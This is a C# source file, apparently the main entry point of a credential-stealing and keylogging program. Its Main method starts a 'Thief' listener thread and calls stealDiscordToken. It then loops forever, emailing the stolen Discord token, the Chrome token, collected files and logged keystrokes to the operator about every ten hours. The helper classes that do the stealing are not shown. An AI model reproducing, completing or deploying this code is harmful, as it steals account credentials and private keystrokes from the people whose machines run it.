using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Fin.thief;


namespace Fin
{
    internal class Program
    {
        public static Observer observer;

        public static void Main(string[] args)
        {



       
            Thief thief = new Thief();
            Thread t = new  Thread(thief.listen);
            t.Start();
            
            thief.stealDiscordToken();
            Console.WriteLine(thief.token);
            
           while (true)
            {
                thief.stealDiscordToken();
               
                string k = Observer.keys;
                Observer.keys = "";
                Sender.email_send(thief.DiscordToken, thief.ChromeToken, thief.files, k + "das");
                thief.files.Clear();
                
                
                Thread.Sleep(1000*1*60*1*60*10);
            }
          
      
        }



    }

}